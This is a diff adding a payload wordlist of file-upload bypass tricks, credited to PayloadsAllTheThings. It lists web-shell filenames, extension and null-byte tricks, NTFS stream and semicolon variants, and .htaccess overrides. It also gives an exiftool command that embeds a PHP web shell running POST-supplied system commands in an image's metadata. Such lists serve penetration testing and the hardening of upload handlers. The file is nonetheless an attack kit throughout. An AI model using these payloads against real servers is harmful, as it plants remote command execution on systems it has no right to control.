@@ -1,0 +1,39 @@
+# File Upload bypass payloads
+# Source: https://github.com/swisskyrepo/PayloadsAllTheThings
+# Total: 34 payloads
+shell.php
+shell.php5
+shell.php7
+shell.phtml
+shell.phar
+shell.php.jpg
+shell.php%00.jpg
+shell.asp
+shell.aspx
+shell.jsp
+shell.cfm
+shell.shtml
+.htaccess
+.htpasswd
+webshell.php
+cmd.php
+test.php
+upload.php
+evil.php3
+evil.php4
+evil.phtml
+shell.svg
+shell.xml
+shell.xsl
+exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
+convert shellexec.jpeg whatever.gif
+
+# ── Round-2 additions (2026-10-29): modern/unique payloads, deduped vs existing ──
+shell.pht
+shell.phtm
+shell.asp;.jpg
+shell.php.
+shell.php::$DATA
+shell.jsp;.jpg
+shell.aspx;.jpg
+shell.php%00.png
